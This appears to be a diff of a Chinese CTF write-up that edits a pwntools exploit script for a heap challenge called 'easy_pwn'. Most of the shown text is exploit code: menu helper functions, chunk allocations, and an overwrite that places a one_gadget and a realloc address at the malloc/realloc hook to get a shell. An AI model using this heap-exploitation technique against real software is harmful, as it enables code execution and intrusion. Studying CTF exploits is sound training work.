@@ -380,7 +380,7 @@ icon: icon-html
   
     执行realloc调整，然后跳到realloc_hook，执行one_gadget
   
-    ```
+    ```python
     from pwn import *
     r = process('./easy_pwn')
     #r = remote('node3.buuoj.cn', 28951)
@@ -388,22 +388,23 @@ icon: icon-html
     libc = ELF('libc-2.23.so')
     
     def create(size):
-        r.sendlineafter('choice: ',str(1))
+        r.sendlineafter('choice: ','1')
         r.sendlineafter('size: ',str(size))
     
     def edit(index,size,content):
-        r.sendlineafter('choice: ',str(2))
+        r.sendlineafter('choice: ','2')
         r.sendlineafter('index: ',str(index))
         r.sendlineafter('size: ',str(size))
         r.sendlineafter('content: ',content)
     
     def free(index):
-        r.sendlineafter('choice: ',str(3))
+        r.sendlineafter('choice: ','3')
         r.sendlineafter('index: ',str(index))
     
     def show(index):
-        r.sendlineafter('choice: ',str(4))
+        r.sendlineafter('choice: ','4')
         r.sendlineafter('index: ',str(index))
+        
     create(0x68)#0
     create(0x68)#1
     create(0x68)#2
@@ -445,10 +446,9 @@ icon: icon-html
     create(0x68)#6
     create(0x68)#7
     
-    edit(7,0x68,'\x00'*0xb+p64(one)+p64(realloc)+'\x00'*(0x50-3))
+    edit(7,0x68,'\x00'*0xb+p64(one)+p64(realloc)+'\x00'*0x4d)
     create(0x68)
     r.interactive()
-    
     ```
   
     
